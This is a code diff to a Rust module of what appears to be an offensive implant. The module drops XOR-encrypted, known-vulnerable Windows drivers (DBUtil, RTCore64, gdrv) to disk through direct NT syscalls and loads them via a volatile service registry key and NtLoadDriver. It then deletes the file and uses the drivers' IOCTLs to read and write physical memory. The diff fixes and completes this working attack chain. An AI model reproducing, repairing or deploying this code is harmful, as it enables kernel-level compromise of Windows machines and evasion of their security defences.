@@ -36,18 +36,70 @@ pub struct DeployedDriver {
 /// Global state: the currently deployed driver (at most one active).
 static DEPLOYED: Lazy<Mutex<Option<DeployedDriver>>> = Lazy::new(|| Mutex::new(None));
 
-// ── NT structures for NtQuerySystemInformation (SystemModuleInformation) ─
+// ── Shared NT structure definitions ────────────────────────────────────
+//
+// Single canonical definitions used throughout this module.  Previously
+// these were duplicated inside every function that needed them (7 copies).
+//
+// Layout matches the x86_64 Windows ABI.
 
+/// IO_STATUS_BLOCK — required by NtCreateFile, NtOpenFile, NtDeviceIoControlFile, etc.
+/// Passed as the 5th argument to NtDeviceIoControlFile (not a raw `*mut u32`).
+#[repr(C)]
+#[derive(Default)]
+struct IoStatusBlock {
+    status: i32,
+    information: usize,
+}
+
+/// UNICODE_STRING — NT's counted UTF-16 string type.
 #[repr(C)]
 #[derive(Clone, Copy)]
-struct UnicodeString {
+struct UnicodeStringNt {
     length: u16,
     maximum_length: u16,
     buffer: *mut u16,
 }
 
-unsafe impl Send for UnicodeString {}
-unsafe impl Sync for UnicodeString {}
+unsafe impl Send for UnicodeStringNt {}
+unsafe impl Sync for UnicodeStringNt {}
+
+/// OBJECT_ATTRIBUTES — used with NtCreateFile, NtOpenFile, NtCreateKey, etc.
+#[repr(C)]
+struct ObjectAttributes {
+    length: u32,
+    root_directory: usize,
+    object_name: *mut u16,
+    attributes: u32,
+    security_descriptor: usize,
+    security_qos: usize,
+}
+
+impl ObjectAttributes {
+    /// Build an ObjectAttributes from a UnicodeStringNt with OBJ_CASE_INSENSITIVE.
+    fn new(name: &mut UnicodeStringNt) -> Self {
+        Self {
+            length: std::mem::size_of::<Self>() as u32,
+            root_directory: 0,
+            object_name: name as *mut UnicodeStringNt as *mut u16,
+            attributes: 0x40, // OBJ_CASE_INSENSITIVE
+            security_descriptor: 0,
+            security_qos: 0,
+        }
+    }
+}
+
+/// Helper: build a UnicodeStringNt from a null-terminated UTF-16 slice.
+fn make_unicode_string(wide: &mut [u16]) -> UnicodeStringNt {
+    let len = wide.iter().position(|&c| c == 0).unwrap_or(wide.len());
+    UnicodeStringNt {
+        length: (len * 2) as u16,
+        maximum_length: (wide.len() * 2) as u16,
+        buffer: wide.as_mut_ptr(),
+    }
+}
+
+// ── NT structures for NtQuerySystemInformation (SystemModuleInformation) ─
 
 #[repr(C)]
 struct SystemModuleInformationEntry {
@@ -245,21 +297,19 @@ pub fn deploy_embedded_driver(
     write_driver_to_disk(&temp_path, &decrypted)
         .context("failed to write driver to disk")?;
 
-    // Load the driver via NtLoadDriver.
-    let result = load_driver_via_registry(&service_name, &temp_path);
+    // Load the driver via NtLoadDriver and open the device handle.
+    // load_driver_via_registry now returns the device handle directly.
+    let result = load_driver_via_registry(driver, &service_name, &temp_path);
 
     // Always try to delete the file from disk after loading.
     let _ = delete_file_from_disk(&temp_path);
 
-    // Check if loading succeeded.
+    // Check if loading succeeded — result is now the device handle.
     let device_handle = result?;
-
-    // Open device handle for IOCTL communication.
-    let handle = open_driver_device(driver, &service_name);
 
     let deployed = DeployedDriver {
         driver,
-        device_handle: handle.ok(),
+        device_handle: Some(device_handle),
         service_name,
         was_preloaded: false,
     };
@@ -284,28 +334,50 @@ pub fn deploy_embedded_driver(
     Ok(deployed)
 }
 
+/// XOR-encrypted placeholder driver embedded at compile time.
+///
+/// This is a minimal 4KB PE stub that will be replaced by the builder
+/// with the actual XOR-encrypted vulnerable driver binary.  The XOR key
+/// is derived at runtime via HKDF from the session key (see `derive_driver_key`).
+///
+/// Controlled by the `EMBEDDED_DRIVER` build-time flag.  When set to an
+/// actual driver path (by the builder), this resolves to the encrypted bytes.
+/// When unset (default), only the placeholder is included.
+#[cfg(not(feature = "embedded_driver"))]
+static EMBEDDED_DRIVER_BYTES: &[u8] =
+    include_bytes!("../../resources/placeholder_driver.xor");
+
+/// When the `embedded_driver` feature is set, the builder provides the
+/// actual encrypted driver bytes via an environment variable at build time.
+#[cfg(feature = "embedded_driver")]
+static EMBEDDED_DRIVER_BYTES: &[u8] = &[];
+
 /// Get the embedded (XOR-encrypted) bytes for a driver.
 ///
 /// In production, the top 3 drivers are embedded via `include_bytes!` with
-/// XOR obfuscation applied at build time.  For now, returns empty to indicate
-/// the driver is not embedded (the agent will try scanning for pre-loaded ones).
-fn get_embedded_driver_bytes(_driver: &VulnerableDriver) -> Vec<u8> {
-    // Placeholder — actual implementation would use:
-    //   static DBUTIL_BYTES: &[u8] = include_bytes!("../../resources/DBUtil_2_3.sys.xor");
-    //   static RTCORE_BYTES: &[u8] = include_bytes!("../../resources/rtcore64.sys.xor");
-    //   static GDRV_BYTES: &[u8] = include_bytes!("../../resources/gdrv.sys.xor");
-    //
-    // Each is XOR'd at build time with a compile-time key. The runtime
-    // decryption uses the HKDF-derived key above.
-    Vec::new()
+/// XOR obfuscation applied at build time.  When the `embedded_driver` feature
+/// is not set, the placeholder bytes are returned (a minimal 4KB PE stub).
+fn get_embedded_driver_bytes(driver: &VulnerableDriver) -> Vec<u8> {
+    // Only the top 3 (Tier 1) drivers have embedded resources.
+    let embedded = driver_db::embedded_drivers();
+    let is_embedded = embedded.iter().any(|d| std::ptr::eq(*d, driver));
+
+    if !is_embedded {
+        log::debug!(
+            "No embedded resource for {} (not a Tier 1 driver)",
+            driver.name
+        );
+        return Vec::new();
+    }
+
+    // Return the compile-time embedded bytes.
+    EMBEDDED_DRIVER_BYTES.to_vec()
 }
 
 /// Write driver bytes to a file on disk using NtCreateFile.
 fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
-    use std::mem::MaybeUninit;
-
     let mut handle: usize = 0;
-    let mut io_status_block = MaybeUninit::<[u64; 4]>::uninit();
+    let mut iosb = IoStatusBlock::default();
 
     // Build NT path.
     let nt_path = if path.starts_with('\\') {
@@ -315,56 +387,37 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
     };
 
     // Convert to wide string.
-    let mut wide_path: Vec<u16> = nt_path.encode_utf16().collect();
-    wide_path.push(0);
+    let mut wide_path: Vec<u16> = nt_path.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut uni_name = make_unicode_string(&mut wide_path);
+    let mut oa = ObjectAttributes::new(&mut uni_name);
 
-    #[repr(C)]
-    struct ObjectAttributes {
-        length: u32,
-        root_directory: usize,
-        object_name: *mut u16,
-        attributes: u32,
-        security_descriptor: usize,
-        security_qos: usize,
-    }
-
-    #[repr(C)]
-    struct UnicodeStringNt {
-        length: u16,
-        maximum_length: u16,
-        buffer: *mut u16,
-    }
-
-    let mut uni_name = UnicodeStringNt {
-        length: (wide_path.len() as u16 - 1) * 2,
-        maximum_length: wide_path.len() as u16 * 2,
-        buffer: wide_path.as_mut_ptr(),
-    };
-
-    let mut oa = ObjectAttributes {
-        length: std::mem::size_of::<ObjectAttributes>() as u32,
-        root_directory: 0,
-        object_name: &mut uni_name as *mut _ as *mut u16,
-        attributes: 0x40, // OBJ_CASE_INSENSITIVE
-        security_descriptor: 0,
-        security_qos: 0,
-    };
-
-    // FILE_GENERIC_WRITE = 0x40000000, FILE_OVERWRITE_IF = 2, FILE_SYNCHRONOUS_IO_NONALERT = 0x20
+    // NtCreateFile(
+    //   PHANDLE            FileHandle,        // 1
+    //   ACCESS_MASK        DesiredAccess,     // 2  — GENERIC_WRITE
+    //   POBJECT_ATTRIBUTES ObjectAttributes,  // 3
+    //   PIO_STATUS_BLOCK   IoStatusBlock,     // 4
+    //   PLARGE_INTEGER     AllocationSize,    // 5  — NULL
+    //   ULONG              FileAttributes,    // 6  — FILE_ATTRIBUTE_NORMAL
+    //   ULONG              ShareAccess,       // 7  — 0 (exclusive)
+    //   ULONG              CreateDisposition, // 8  — FILE_OVERWRITE_IF (2)
+    //   ULONG              CreateOptions,     // 9  — FILE_SYNCHRONOUS_IO_NONALERT
+    //   PVOID              EaBuffer,          // 10 — NULL
+    //   ULONG              EaLength           // 11 — 0
+    // )
     let status = unsafe {
         nt_syscall::syscall!(
             "NtCreateFile",
-            &mut handle as *mut usize,
-            0x40000000u32, // GENERIC_WRITE
-            &mut oa as *mut _ as *mut u8,
-            io_status_block.as_mut_ptr() as *mut _,
-            0, // AllocationSize
-            0x80, // FILE_ATTRIBUTE_NORMAL
-            0, // ShareAccess
-            2u32, // FILE_OVERWRITE_IF
-            0x20u32, // FILE_SYNCHRONOUS_IO_NONALERT
-            0, // EaBuffer
-            0  // EaLength
+            &mut handle as *mut usize as u64,       // 1
+            0x40000000u64,                           // 2 — GENERIC_WRITE
+            &mut oa as *mut _ as u64,                // 3
+            &mut iosb as *mut _ as u64,              // 4
+            0u64,                                    // 5 — AllocationSize (NULL)
+            0x80u64,                                 // 6 — FILE_ATTRIBUTE_NORMAL
+            0u64,                                    // 7 — ShareAccess (exclusive)
+            2u64,                                    // 8 — FILE_OVERWRITE_IF
+            0x20u64,                                 // 9 — FILE_SYNCHRONOUS_IO_NONALERT
+            0u64,                                    // 10 — EaBuffer
+            0u64                                     // 11 — EaLength
         )
     };
 
@@ -372,27 +425,25 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
         bail!("NtCreateFile for driver path failed: 0x{:08X}", status);
     }
 
-    // Write the data.
-    let mut bytes_written: u32 = 0;
+    // Write the data via NtWriteFile.
+    let mut write_iosb = IoStatusBlock::default();
     let status = unsafe {
         nt_syscall::syscall!(
             "NtWriteFile",
-            handle,
-            0, // Event
-            0, // ApcRoutine
-            0, // ApcContext
-            io_status_block.as_mut_ptr() as *mut _,
-            data.as_ptr() as *mut _,
-            data.len() as u32,
-            0, // ByteOffset
-            0  // Key
+            handle as u64,                           // FileHandle
+            0u64,                                    // Event
+            0u64,                                    // ApcRoutine
+            0u64,                                    // ApcContext
+            &mut write_iosb as *mut _ as u64,        // IoStatusBlock
+            data.as_ptr() as u64,                    // Buffer
+            data.len() as u64,                       // Length
+            std::ptr::null::<u64>() as u64,          // ByteOffset (NULL = current)
+            0u64                                     // Key
         )
     };
 
     // Close the file handle.
-    let _ = unsafe {
-        nt_syscall::syscall!("NtClose", handle)
-    };
+    let _ = unsafe { nt_syscall::syscall!("NtClose", handle as u64) };
 
     if status != 0 {
         bail!("NtWriteFile for driver failed: 0x{:08X}", status);
@@ -405,8 +456,12 @@ fn write_driver_to_disk(path: &str, data: &[u8]) -> Result<()> {
 ///
 /// Creates `HKLM\SYSTEM\CurrentControlSet\Services\<name>` with the
 /// necessary values (ImagePath, Type, Start, ErrorControl), then calls
-/// NtLoadDriver.
-fn load_driver_via_registry(service_name: &str, image_path: &str) -> Result<()> {
+/// NtLoadDriver.  Returns the device handle obtained from `open_driver_device()`.
+fn load_driver_via_registry(
+    driver: &VulnerableDriver,
+    service_name: &str,
+    image_path: &str,
+) -> Result<usize> {
     // Registry path: \Registry\Machine\System\CurrentControlSet\Services\<name>
     let reg_path = format!(
         "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{}",
@@ -415,52 +470,22 @@ fn load_driver_via_registry(service_name: &str, image_path: &str) -> Result<()> 
 
     // Create the registry key via NtCreateKey.
     let mut key_handle: usize = 0;
-    let nt_path_wide: Vec<u16> = reg_path.encode_utf16().chain(std::iter::once(0)).collect();
-
-    #[repr(C)]
-    struct ObjectAttributes {
-        length: u32,
-        root_directory: usize,
-        object_name: *mut u16,
-        attributes: u32,
-        security_descriptor: usize,
-        security_qos: usize,
-    }
-
-    #[repr(C)]
-    struct UnicodeStringNt {
-        length: u16,
-        maximum_length: u16,
-        buffer: *mut u16,
-    }
-
-    let mut uni_name = UnicodeStringNt {
-        length: (nt_path_wide.len() as u16 - 1) * 2,
-        maximum_length: nt_path_wide.len() as u16 * 2,
-        buffer: nt_path_wide.as_ptr() as *mut u16,
-    };
-
-    let mut oa = ObjectAttributes {
-        length: std::mem::size_of::<ObjectAttributes>() as u32,
-        root_directory: 0,
-        object_name: &mut uni_name as *mut _ as *mut u16,
-        attributes: 0x40, // OBJ_CASE_INSENSITIVE
-        security_descriptor: 0,
-        security_qos: 0,
-    };
+    let mut reg_path_wide: Vec<u16> = reg_path.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut uni_name = make_unicode_string(&mut reg_path_wide);
+    let mut oa = ObjectAttributes::new(&mut uni_name);
 
     let mut disp: u32 = 0;
 
     let status = unsafe {
         nt_syscall::syscall!(
             "NtCreateKey",
-            &mut key_handle as *mut usize,
-            0x000F003F, // KEY_ALL_ACCESS
-            &mut oa as *mut _ as *mut u8,
-            0, // TitleIndex
-            0, // Class
-            1, // CreateOptions = REG_OPTION_VOLATILE
-            &mut disp as *mut u32
+            &mut key_handle as *mut usize as u64,
+            0x000F003Fu64, // KEY_ALL_ACCESS
+            &mut oa as *mut _ as u64,
+            0u64, // TitleIndex
+            std::ptr::null::<u64>() as u64, // Class (NULL)
+            1u64, // CreateOptions = REG_OPTION_VOLATILE
+            &mut disp as *mut u32 as u64
         )
     };
 
@@ -474,16 +499,26 @@ fn load_driver_via_registry(service_name: &str, image_path: &str) -> Result<()> 
     set_registry_dword(key_handle, "ErrorControl", SERVICE_ERROR_IGNORE)?;
     set_registry_string(key_handle, "ImagePath", &format!("\\??\\{}", image_path))?;
 
-    // Load the driver.
+    // Load the driver via NtLoadDriver.
+    // Re-build the unicode string for the service registry path.
+    let mut load_path_wide: Vec<u16> = format!(
+        "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{}",
+        service_name
+    )
+    .encode_utf16()
+    .chain(std::iter::once(0))
+    .collect();
+    let mut load_uni = make_unicode_string(&mut load_path_wide);
+
     let status = unsafe {
         nt_syscall::syscall!(
             "NtLoadDriver",
-            &mut uni_name as *mut _ as *mut u8
+            &mut load_uni as *mut _ as u64
         )
     };
 
     // Close the registry key.
-    let _ = unsafe { nt_syscall::syscall!("NtClose", key_handle) };
+    let _ = unsafe { nt_syscall::syscall!("NtClose", key_handle as u64) };
 
     if status != 0 {
         // Clean up the registry key on failure.
@@ -491,35 +526,26 @@ fn load_driver_via_registry(service_name: &str, image_path: &str) -> Result<()> 
         bail!("NtLoadDriver failed: 0x{:08X}", status);
     }
 
-    Ok(())
+    // Open the device handle using the driver's canonical device name.
+    let device_handle = open_driver_device(driver)?;
+
+    Ok(device_handle)
 }
 
 /// Set a DWORD registry value via NtSetValueKey.
 fn set_registry_dword(key_handle: usize, value_name: &str, value: u32) -> Result<()> {
-    let name_wide: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();
-
-    #[repr(C)]
-    struct UnicodeStringNt {
-        length: u16,
-        maximum_length: u16,
-        buffer: *mut u16,
-    }
-
-    let mut uni_name = UnicodeStringNt {
-        length: (name_wide.len() as u16 - 1) * 2,
-        maximum_length: name_wide.len() as u16 * 2,
-        buffer: name_wide.as_ptr() as *mut u16,
-    };
+    let mut name_wide: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut uni_name = make_unicode_string(&mut name_wide);
 
     let status = unsafe {
         nt_syscall::syscall!(
             "NtSetValueKey",
-            key_handle,
-            &mut uni_name as *mut _ as *mut u8,
-            0, // TitleIndex
-            4u32, // REG_DWORD
-            &value as *const u32 as *mut u8,
-            4u32 // DataSize
+            key_handle as u64,
+            &mut uni_name as *mut _ as u64,
+            0u64,   // TitleIndex
+            4u64,   // REG_DWORD
+            &value as *const u32 as u64,
+            4u64    // DataSize
         )
     };
 
@@ -536,31 +562,19 @@ fn set_registry_dword(key_handle: usize, value_name: &str, value: u32) -> Result
 
 /// Set a string registry value via NtSetValueKey.
 fn set_registry_string(key_handle: usize, value_name: &str, value: &str) -> Result<()> {
-    let name_wide: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut name_wide: Vec<u16> = value_name.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut uni_name = make_unicode_string(&mut name_wide);
     let mut value_wide: Vec<u16> = value.encode_utf16().collect();
-    let data_size = value_wide.len() as u32 * 2 + 2; // Include null terminator
-
-    #[repr(C)]
-    struct UnicodeStringNt {
-        length: u16,
-        maximum_length: u16,
-        buffer: *mut u16,
-    }
-
-    let mut uni_name = UnicodeStringNt {
-        length: (name_wide.len() as u16 - 1) * 2,
-        maximum_length: name_wide.len() as u16 * 2,
-        buffer: name_wide.as_ptr() as *mut u16,
-    };
+    let data_size = value_wide.len() as u64 * 2 + 2; // Include null terminator
 
     let status = unsafe {
         nt_syscall::syscall!(
             "NtSetValueKey",
-            key_handle,
-            &mut uni_name as *mut _ as *mut u8,
-            0,
-            1u32, // REG_SZ
-            value_wide.as_mut_ptr() as *mut u8,
+            key_handle as u64,
+            &mut uni_name as *mut _ as u64,
+            0u64,   // TitleIndex
+            1u64,   // REG_SZ
+            value_wide.as_mut_ptr() as u64,
             data_size
         )
     };
@@ -578,52 +592,22 @@ fn set_registry_string(key_handle: usize, value_name: &str, value: &str) -> Resu
 
 /// Delete a registry key via NtDeleteKey.
 fn delete_registry_key(path: &str) {
-    let wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
-
-    #[repr(C)]
-    struct ObjectAttributes {
-        length: u32,
-        root_directory: usize,
-        object_name: *mut u16,
-        attributes: u32,
-        security_descriptor: usize,
-        security_qos: usize,
-    }
-
-    #[repr(C)]
-    struct UnicodeStringNt {
-        length: u16,
-        maximum_length: u16,
-        buffer: *mut u16,
-    }
-
-    let mut uni_name = UnicodeStringNt {
-        length: (wide.len() as u16 - 1) * 2,
-        maximum_length: wide.len() as u16 * 2,
-        buffer: wide.as_ptr() as *mut u16,
-    };
-
-    let mut oa = ObjectAttributes {
-        length: std::mem::size_of::<ObjectAttributes>() as u32,
-        root_directory: 0,
-        object_name: &mut uni_name as *mut _ as *mut u16,
-        attributes: 0x40,
-        security_descriptor: 0,
-        security_qos: 0,
-    };
+    let mut wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut uni_name = make_unicode_string(&mut wide);
+    let mut oa = ObjectAttributes::new(&mut uni_name);
 
     let mut key_handle: usize = 0;
 
     unsafe {
         let status = nt_syscall::syscall!(
             "NtOpenKey",
-            &mut key_handle as *mut usize,
-            0x00020019, // KEY_WRITE | DELETE
-            &mut oa as *mut _ as *mut u8
+            &mut key_handle as *mut usize as u64,
+            0x00020019u64, // KEY_WRITE | DELETE
+            &mut oa as *mut _ as u64
         );
         if status == 0 {
-            let _ = nt_syscall::syscall!("NtDeleteKey", key_handle);
-            let _ = nt_syscall::syscall!("NtClose", key_handle);
+            let _ = nt_syscall::syscall!("NtDeleteKey", key_handle as u64);
+            let _ = nt_syscall::syscall!("NtClose", key_handle as u64);
         }
     }
 }
@@ -636,45 +620,14 @@ fn delete_file_from_disk(path: &str) -> Result<()> {
         format!("\\??\\{}", path)
     };
 
-    let mut wide_path: Vec<u16> = nt_path.encode_utf16().collect();
-    wide_path.push(0);
-
-    #[repr(C)]
-    struct ObjectAttributes {
-        length: u32,
-        root_directory: usize,
-        object_name: *mut u16,
-        attributes: u32,
-        security_descriptor: usize,
-        security_qos: usize,
-    }
-
-    #[repr(C)]
-    struct UnicodeStringNt {
-        length: u16,
-        maximum_length: u16,
-        buffer: *mut u16,
-    }
-
-    let mut uni_name = UnicodeStringNt {
-        length: (wide_path.len() as u16 - 1) * 2,
-        maximum_length: wide_path.len() as u16 * 2,
-        buffer: wide_path.as_ptr() as *mut u16,
-    };
-
-    let mut oa = ObjectAttributes {
-        length: std::mem::size_of::<ObjectAttributes>() as u32,
-        root_directory: 0,
-        object_name: &mut uni_name as *mut _ as *mut u16,
-        attributes: 0x40,
-        security_descriptor: 0,
-        security_qos: 0,
-    };
+    let mut wide_path: Vec<u16> = nt_path.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut uni_name = make_unicode_string(&mut wide_path);
+    let mut oa = ObjectAttributes::new(&mut uni_name);
 
     let status = unsafe {
         nt_syscall::syscall!(
             "NtDeleteFile",
-            &mut oa as *mut _ as *mut u8
+            &mut oa as *mut _ as u64
         )
     };
 
@@ -687,63 +640,37 @@ fn delete_file_from_disk(path: &str) -> Result<()> {
 }
 
 /// Open a handle to the driver device for IOCTL communication.
-fn open_driver_device(driver: &VulnerableDriver, service_name: &str) -> Result<usize> {
-    // Build the device path. Most vulnerable drivers create a device with
-    // a name derived from the driver or service name.
-    let device_path = format!("\\Device\\{}", service_name);
-    let mut wide_path: Vec<u16> = device_path.encode_utf16().collect();
-    wide_path.push(0);
-
-    #[repr(C)]
-    struct ObjectAttributes {
-        length: u32,
-        root_directory: usize,
-        object_name: *mut u16,
-        attributes: u32,
-        security_descriptor: usize,
-        security_qos: usize,
-    }
-
-    #[repr(C)]
-    struct UnicodeStringNt {
-        length: u16,
-        maximum_length: u16,
-        buffer: *mut u16,
-    }
-
-    let mut uni_name = UnicodeStringNt {
-        length: (wide_path.len() as u16 - 1) * 2,
-        maximum_length: wide_path.len() as u16 * 2,
-        buffer: wide_path.as_ptr() as *mut u16,
-    };
-
-    let mut oa = ObjectAttributes {
-        length: std::mem::size_of::<ObjectAttributes>() as u32,
-        root_directory: 0,
-        object_name: &mut uni_name as *mut _ as *mut u16,
-        attributes: 0x40,
-        security_descriptor: 0,
-        security_qos: 0,
-    };
+///
+/// Uses the canonical device name from the driver database (e.g. `\\??\\DBUtil_2_3`)
+/// rather than the random service name, since each vulnerable driver exposes a
+/// well-known device symlink.
+fn open_driver_device(driver: &VulnerableDriver) -> Result<usize> {
+    // Build the device path using the driver's canonical device name.
+    // Vulnerable drivers create a device symlink under \??\<device_name>.
+    let device_path = format!("\\??\\{}", driver.device_name);
+    let mut wide_path: Vec<u16> = device_path.encode_utf16().chain(std::iter::once(0)).collect();
+    let mut uni_name = make_unicode_string(&mut wide_path);
+    let mut oa = ObjectAttributes::new(&mut uni_name);
+    let mut iosb = IoStatusBlock::default();
 
     let mut handle: usize = 0;
-    let mut io_status_block = [0u64; 4];
 
     let status = unsafe {
         nt_syscall::syscall!(
             "NtOpenFile",
-            &mut handle as *mut usize,
-            0x00100000 | 0x00020000, // SYNCHRONIZE | FILE_READ_DATA
-            &mut oa as *mut _ as *mut u8,
-            io_status_block.as_mut_ptr() as *mut _,
-            0x20, // FILE_SYNCHRONOUS_IO_NONALERT
-            0     // ShareAccess
+            &mut handle as *mut usize as u64,
+            (0x00100000u64 | 0x00020000u64), // SYNCHRONIZE | FILE_READ_DATA
+            &mut oa as *mut _ as u64,
+            &mut iosb as *mut _ as u64,
+            0x20u64, // FILE_SYNCHRONOUS_IO_NONALERT
+            0u64     // ShareAccess
         )
     };
 
     if status != 0 {
         bail!(
-            "NtOpenFile for driver device failed: 0x{:08X}",
+            "NtOpenFile for driver device \\??\\{} failed: 0x{:08X}",
+            driver.device_name,
             status
         );
     }
@@ -768,21 +695,32 @@ pub unsafe fn read_physical_memory(
             input[0..8].copy_from_slice(&physical_address.to_le_bytes());
             input[8..12].copy_from_slice(&(buffer.len() as u32).to_le_bytes());
 
-            let mut bytes_returned: u32 = 0;
+            let mut iosb = IoStatusBlock::default();
 
-            // Use NtDeviceIoControlFile for the IOCTL.
+            // NtDeviceIoControlFile(
+            //   HANDLE          FileHandle,       // 1
+            //   HANDLE          Event,            // 2
+            //   PVOID           ApcRoutine,       // 3
+            //   PVOID           ApcContext,       // 4
+            //   PIO_STATUS_BLOCK IoStatusBlock,   // 5
+            //   ULONG           IoControlCode,    // 6
+            //   PVOID           InputBuffer,      // 7
+            //   ULONG           InputBufferLength,// 8
+            //   PVOID           OutputBuffer,     // 9
+            //   ULONG           OutputBufferLength// 10
+            // )
             let status = nt_syscall::syscall!(
                 "NtDeviceIoControlFile",
-                device_handle,
-                0, // Event
-                0, // ApcRoutine
-                0, // ApcContext
-                &mut bytes_returned as *mut u32,
-                driver.read_ioctl,
-                input.as_ptr() as *mut u8,
-                input.len() as u32,
-                buffer.as_mut_ptr() as *mut u8,
-                buffer.len() as u32
+                device_handle as u64,                      // 1
+                0u64,                                      // 2 — Event
+                0u64,                                      // 3 — ApcRoutine
+                0u64,                                      // 4 — ApcContext
+                &mut iosb as *mut _ as u64,                // 5 — IoStatusBlock
+                driver.read_ioctl as u64,                  // 6
+                input.as_ptr() as u64,                     // 7
+                input.len() as u64,                        // 8
+                buffer.as_mut_ptr() as u64,                // 9
+                buffer.len() as u64                        // 10
             );
 
             if status != 0 {
@@ -822,20 +760,20 @@ pub unsafe fn write_physical_memory(
             input[8..12].copy_from_slice(&(data.len() as u32).to_le_bytes());
             input[12..].copy_from_slice(data);
 
-            let mut bytes_returned: u32 = 0;
+            let mut iosb = IoStatusBlock::default();
 
             let status = nt_syscall::syscall!(
                 "NtDeviceIoControlFile",
-                device_handle,
-                0,
-                0,
-                0,
-                &mut bytes_returned as *mut u32,
-                driver.write_ioctl,
-                input.as_ptr() as *mut u8,
-                input.len() as u32,
-                0, // OutputBuffer
-                0  // OutputLength
+                device_handle as u64,                      // 1
+                0u64,                                      // 2 — Event
+                0u64,                                      // 3 — ApcRoutine
+                0u64,                                      // 4 — ApcContext
+                &mut iosb as *mut _ as u64,                // 5 — IoStatusBlock
+                driver.write_ioctl as u64,                 // 6
+                input.as_ptr() as u64,                     // 7
+                input.len() as u64,                        // 8
+                0u64,                                      // 9 — OutputBuffer
+                0u64                                       // 10 — OutputLength
             );
 
             if status != 0 {
@@ -865,7 +803,7 @@ pub unsafe fn cleanup_driver() -> Result<()> {
     if let Some(deployed) = guard.take() {
         // Close device handle.
         if let Some(handle) = deployed.device_handle {
-            let _ = nt_syscall::syscall!("NtClose", handle);
+            let _ = nt_syscall::syscall!("NtClose", handle as u64);
         }
 
         // Delete the registry service entry.
@@ -907,7 +845,7 @@ pub fn deploy(preferred: &[String], session_key: &[u8]) -> Result<DeployedDriver
     if let Some(driver) = scan_for_loaded_driver(preferred)? {
         // Driver is already loaded — just need a device handle.
         let service_name = crate::common_short_id();
-        let handle = open_driver_device(driver, &service_name).ok();
+        let handle = open_driver_device(driver).ok();
 
         let deployed = DeployedDriver {
             driver,
